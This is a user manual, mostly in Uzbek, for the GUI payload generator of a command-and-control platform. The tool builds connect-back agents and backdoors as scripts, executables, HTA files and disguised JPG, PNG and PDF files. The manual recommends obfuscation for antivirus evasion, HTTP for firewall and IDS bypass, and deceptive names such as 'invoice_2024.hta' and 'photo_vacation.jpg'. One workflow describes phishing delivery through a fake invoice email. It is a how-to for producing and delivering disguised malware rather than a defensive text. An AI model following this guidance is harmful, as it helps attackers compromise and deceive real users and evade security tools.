# 🎨 Grafik Payload Generator - Foydalanish Qo'llanma

Payload'larni grafik interfeys orqali yaratish va protokol tanlash.

---

## 🚀 Ishga tushirish

### Windows:
```bash
start_payload_gui.bat
```

### Linux/macOS:
```bash
chmod +x start_payload_gui.sh
./start_payload_gui.sh
```

### Yoki to'g'ridan-to'g'ri:
```bash
python gui/payload_generator_gui.py
```

---

## 🎯 Interfeys Ko'rinishi

```
┌─────────────────────────────────────────────────┐
│        🛠️  Payload Generator                    │
├─────────────────────────────────────────────────┤
│  Configuration                                  │
│  ┌───────────────────────────────────────────┐ │
│  │ Server Host: [127.0.0.1            ]      │ │
│  │ Port:        [8080                 ]      │ │
│  └───────────────────────────────────────────┘ │
│                                                 │
│  Payload Options                                │
│  ┌───────────────────────────────────────────┐ │
│  │ Payload Type:   [python        ▼]         │ │
│  │ Listener Type:  [http          ▼] 📡 HTTP │ │
│  │ ☑ Enable Obfuscation                      │ │
│  └───────────────────────────────────────────┘ │
│                                                 │
│  Connection Info                                │
│  📍 Agent will connect to: http://127.0.0.1:8080│
│                                                 │
│  Output                                         │
│  ┌───────────────────────────────────────────┐ │
│  │ Output File: [payload.py       ] [Browse] │ │
│  └───────────────────────────────────────────┘ │
│                                                 │
│  [🚀 Generate Payload]  [👁️ Preview]          │
│                                                 │
│  Status                                         │
│  ┌───────────────────────────────────────────┐ │
│  │ ✅ Payload Generator tayyor                │ │
│  │                                             │ │
│  └───────────────────────────────────────────┘ │
└─────────────────────────────────────────────────┘
```

---

## 📋 Komponentlar

### 1. **Server Configuration**

**Server Host:**
- Default: `127.0.0.1` (localhost)
- Production: Server IP manzili
- Examples:
  - `192.168.1.100` (local network)
  - `example.com` (domain)
  - `10.0.0.5` (VPN)

**Port:**
- HTTP default: `8080`
- TCP default: `4444`
- Custom: istalgan port (1-65535)

💡 **Auto-update:** Host/Port o'zgarganda connection info avtomatik yangilanadi!

---

### 2. **Payload Options**

#### Payload Type (15 format):

**Scripts:**
- 🐍 **python** - Python script (.py)
- 💻 **powershell** - PowerShell script (.ps1)
- 🐧 **bash** - Bash script (.sh)
- 📝 **batch** - Batch file (.bat)
- 📜 **vbs** - VBScript (.vbs)

**Windows Specific:**
- 🌐 **hta** - HTML Application (.hta)
- 📄 **js** - JScript (.js)
- 🔐 **vbe** - VBScript Encoded (.vbe)

**Executables:**
- ⚙️ **exe** - Windows Executable (.exe)
- 🖼️ **scr** - Screensaver (.scr)
- 🐧 **elf** - Linux Executable (no ext)
- 📚 **dll** - Dynamic Library (.dll)

**Steganography:**
- 📷 **jpg** - JPEG image (.jpg)
- 🎨 **png** - PNG image (.png)
- 📄 **pdf** - PDF document (.pdf)

💡 **Auto-extension:** Payload type tanlanganda fayl nomi avtomatik yangilanadi!

---

#### Listener Type (Protocol):

**📡 HTTP (Web-based):**
- **Port:** 8080 (default)
- **Protocol:** HTTP/HTTPS
- **Use case:** 
  - Firewall bypass (port 80/443)
  - Web traffic camouflage
  - NAT/Proxy friendly
- **Color:** 🟦 Blue

**🔌 TCP (Raw socket):**
- **Port:** 4444 (default)
- **Protocol:** Raw TCP
- **Use case:**
  - Direct connection
  - Lower overhead
  - Faster communication
- **Color:** 🟧 Orange

💡 **Smart defaults:** HTTP tanlanganda port 8080, TCP da 4444 bo'ladi!

---

#### Obfuscation:

- ☐ **Disabled** - Oddiy kod
- ☑ **Enabled** - Obfuscate qilingan kod
  - Base64 encoding
  - Variable name randomization
  - AV bypass techniques

---

### 3. **Connection Info**

Real-time connection manzilini ko'rsatadi:

**HTTP mode:**
```
📍 Agent will connect to: http://192.168.1.100:8080
```
(Yashil rang 🟢)

**TCP mode:**
```
📍 Agent will connect to: tcp://192.168.1.100:4444
```
(To'q sariq rang 🟧)

💡 **Live update:** Host, Port yoki Listener type o'zgarganda avtomatik yangilanadi!

---

### 4. **Output**

**Output File:**
- Default: `payload.py`
- Auto-extension: Payload type bo'yicha
- Examples:
  - `agent.py` (Python)
  - `backdoor.ps1` (PowerShell)
  - `update.jpg` (JPG steganography)
  - `invoice.pdf` (PDF polyglot)

**Browse button:**
- File dialog ochadi
- File type filter (*.py, *.ps1, etc.)
- Save location tanlash

---

### 5. **Action Buttons**

**🚀 Generate Payload:**
- Payload yaratadi
- Faylga saqlaydi
- Success dialog ko'rsatadi:
  ```
  Payload yaratildi!
  
  File: payload.py
  Size: 2,345 bytes
  Protocol: 📡 HTTP
  Target: 127.0.0.1:8080
  ```

**👁️ Preview:**
- Payload kodni ko'rsatadi
- Saqlashdan oldin tekshirish
- Read-only preview window

---

### 6. **Status Log**

Real-time log messages:

```
✅ Payload Generator tayyor

==================================================
🚀 Payload yaratilmoqda...
   Type: python
   Listener: http
   Server: 192.168.1.100:8080
   Output: agent.py
   Obfuscate: No
==================================================

✅ Payload muvaffaqiyatli yaratildi!
   Size: 2,345 bytes
   Protocol: 📡 HTTP
   Time: 14:35:22
```

---

## 🎬 Foydalanish Misollari

### Example 1: Basic HTTP Python Payload

**Settings:**
```
Server Host:    127.0.0.1
Port:           8080
Payload Type:   python
Listener Type:  http
Obfuscation:    ☐
Output File:    agent.py
```

**Connection Info:**
```
📍 Agent will connect to: http://127.0.0.1:8080
```

**Result:**
```
✅ Payload created: agent.py (2,345 bytes)
Protocol: 📡 HTTP
```

---

### Example 2: TCP PowerShell with Obfuscation

**Settings:**
```
Server Host:    192.168.1.100
Port:           4444
Payload Type:   powershell
Listener Type:  tcp
Obfuscation:    ☑
Output File:    backdoor.ps1
```

**Connection Info:**
```
📍 Agent will connect to: tcp://192.168.1.100:4444
```

**Result:**
```
✅ Payload created: backdoor.ps1 (4,567 bytes)
Protocol: 🔌 TCP
Obfuscated: Yes
```

---

### Example 3: Steganography JPG Payload

**Settings:**
```
Server Host:    example.com
Port:           8080
Payload Type:   jpg
Listener Type:  http
Obfuscation:    ☐
Output File:    update.jpg
```

**Connection Info:**
```
📍 Agent will connect to: http://example.com:8080
```

**Result:**
```
✅ Payload created: update.jpg (15,234 bytes)
Protocol: 📡 HTTP
Type: Polyglot JPG + Python
```

---

### Example 4: Production HTA Payload

**Settings:**
```
Server Host:    c2.company.com
Port:           443
Payload Type:   hta
Listener Type:  http
Obfuscation:    ☑
Output File:    invoice_2024.hta
```

**Connection Info:**
```
📍 Agent will connect to: http://c2.company.com:443
```

**Result:**
```
✅ Payload created: invoice_2024.hta (3,890 bytes)
Protocol: 📡 HTTP
Obfuscated: Yes
Social Engineering: Invoice theme
```

---

## ⚙️ Listener Type Tanlash

### Qachon HTTP ishlatish:

✅ **Firewall bypass kerak**
- Port 80/443 ko'pincha ochiq
- HTTP traffic normal

✅ **NAT/Proxy orqali**
- HTTP proxy support
- URL-based routing

✅ **Web traffic camouflage**
- IDS/IPS bypass
- Looks like normal browsing

✅ **Stable connection**
- Reconnection handling
- Session management

**Optimal scenarios:**
- Corporate networks
- Public WiFi
- Restricted environments
- Long-term persistence

---

### Qachon TCP ishlatish:

✅ **Direct connection**
- No intermediate proxies
- Same network segment

✅ **Low latency kerak**
- Real-time commands
- Fast response needed

✅ **Low overhead**
- Minimal protocol overhead
- Efficient data transfer

✅ **Custom protocols**
- Full control over data
- Binary protocols

**Optimal scenarios:**
- Local network testing
- LAN environments
- Direct VPN connections
- Speed-critical operations

---

## 🔄 Protocol Comparison

| Feature | HTTP | TCP |
|---------|------|-----|
| **Firewall bypass** | ✅ Excellent | ⚠️ Often blocked |
| **Proxy support** | ✅ Yes | ❌ No |
| **Latency** | ⚠️ Higher | ✅ Lower |
| **Overhead** | ⚠️ More | ✅ Less |
| **Stealth** | ✅ Looks normal | ⚠️ Suspicious |
| **NAT traversal** | ✅ Easy | ⚠️ Difficult |
| **Port** | 80, 443, 8080 | 4444, custom |
| **Detection** | 🟢 Low | 🟡 Medium |

---

## 🎨 Visual Features

### Color Coding:

**Protocol Indicators:**
- 📡 **HTTP** - 🟦 Blue text (`#00aaff`)
- 🔌 **TCP** - 🟧 Orange text (`#ff9900`)

**Connection Status:**
- 📍 **HTTP connection** - 🟢 Green (`#00ff00`)
- 📍 **TCP connection** - 🟧 Orange (`#ff9900`)

**Status Messages:**
- ✅ Success - Green
- ❌ Error - Red
- 🚀 In progress - Yellow

---

### Real-time Updates:

**1. Type host/port:**
```
[typing: 192.168.1.100]
↓
📍 Agent will connect to: http://192.168.1.100:8080
```

**2. Change listener:**
```
[select: tcp]
↓
📡 HTTP → 🔌 TCP
Port: 8080 → 4444
📍 Agent will connect to: tcp://192.168.1.100:4444
```

**3. Change payload type:**
```
[select: powershell]
↓
Output: payload.py → payload.ps1
```

---

## 🔧 Advanced Usage

### Batch Generation Script:

```python
# bulk_generate.py
from gui.payload_generator_gui import PayloadGeneratorGUI
from common.payload_generator import PayloadGenerator

configs = [
    {'type': 'python', 'listener': 'http', 'output': 'http_agent.py'},
    {'type': 'powershell', 'listener': 'tcp', 'output': 'tcp_agent.ps1'},
    {'type': 'jpg', 'listener': 'http', 'output': 'image.jpg'},
]

gen = PayloadGenerator('192.168.1.100', 8080)

for config in configs:
    result = gen.generate(
        payload_type=config['type'],
        listener_type=config['listener'],
        output_file=config['output']
    )
    print(f"✅ {config['output']}: {result['size']} bytes")
```

---

### Custom Protocol Configuration:

```python
# custom_listener.py
# GUI'dan yaratilgan payloadlarni custom protokol bilan

# 1. GUI'da HTTP payload yaratish
# 2. Manually edit listener URL:

# payload.py ichida:
# SERVER_URL = "http://127.0.0.1:8080"  # GUI default
# ↓
# SERVER_URL = "https://c2.example.com/api/v1"  # Custom

# 3. Reverse proxy setup:
# Nginx → custom port/path → C2 server
```

---

## 📊 Workflow Examples

### Penetration Testing Workflow:

**1. Reconnaissance:**
```
Target network: 192.168.1.0/24
Open ports: 80, 443, 8080
Firewall: HTTP allowed
```

**2. Payload Generation:**
```
GUI Settings:
- Host: 192.168.1.100
- Port: 8080
- Type: hta (social engineering)
- Listener: http (firewall bypass)
- Obfuscate: ☑ (AV evasion)
```

**3. Delivery:**
```
Email phishing:
Attachment: invoice_2024.hta
Subject: "Payment Invoice - Action Required"
```

**4. Execution:**
```
User clicks → HTA runs → Agent connects:
📍 http://192.168.1.100:8080
✅ Session established
```

---

### Development/Testing Workflow:

**1. Quick test payload:**
```
GUI:
- Host: localhost
- Port: 8080
- Type: python
- Listener: http
→ test_agent.py
```

**2. Start listener:**
```bash
python server/cli.py
> listener http 8080
```

**3. Run payload:**
```bash
python test_agent.py
```

**4. Verify connection:**
```
CLI shows:
✅ New agent: DESKTOP-ABC123
```

---

## ⚠️ Common Issues

### Issue 1: "All fields required"

**Cause:** Empty host/port/output
**Solution:**
```
✅ Fill all fields:
- Server Host: (required)
- Port: (required)
- Output File: (required)
```

---

### Issue 2: "Port must be number"

**Cause:** Non-numeric port
**Solution:**
```
❌ Port: "abc"
✅ Port: "8080"
```

---

### Issue 3: Payload doesn't connect

**Cause:** Wrong protocol/port
**Solution:**
```
Check listener type matches:
GUI: http:8080 ↔️ Server: http:8080
GUI: tcp:4444 ↔️ Server: tcp:4444
```

---

### Issue 4: File permission error

**Cause:** Write access denied
**Solution:**
```
# Run with permissions or change output path
Output: C:\payloads\agent.py
       ↓
Output: D:\temp\agent.py
```

---

## 🎯 Best Practices

### 1. **Protocol Selection:**

```
✅ Use HTTP for:
- Corporate networks
- Firewall environments
- Internet-facing targets

✅ Use TCP for:
- LAN testing
- Direct connections
- Speed-critical ops
```

### 2. **Obfuscation:**

```
✅ Enable for:
- Production payloads
- AV evasion
- Security testing

❌ Disable for:
- Development
- Debugging
- Learning/education
```

### 3. **Naming Convention:**

```
Development:
test_agent.py, debug_payload.ps1

Production:
invoice_2024.pdf, update_install.hta, photo_vacation.jpg
```

### 4. **Testing:**

```
1. Generate with obfuscation OFF
2. Test functionality
3. Enable obfuscation
4. Test AV detection
5. Deploy
```

---

## 📚 Keyboard Shortcuts

- `Ctrl+G` - Generate payload
- `Ctrl+P` - Preview payload
- `Ctrl+S` - Save (browse)
- `Ctrl+Q` - Quit

---

## 🔗 Related Documentation

- [PAYLOAD_GENERATOR.md](PAYLOAD_GENERATOR.md) - CLI usage
- [PAYLOAD_FORMATS.md](PAYLOAD_FORMATS.md) - Format details
- [STEGANOGRAPHY_PAYLOADS.md](STEGANOGRAPHY_PAYLOADS.md) - JPG/PNG/PDF
- [CONNECTION_FLOW.md](CONNECTION_FLOW.md) - Agent connection process

---

**Created by:** C2 Platform Team  
**GUI Version:** 2.0  
**Features:** 15 payload types, 2 protocols, real-time updates
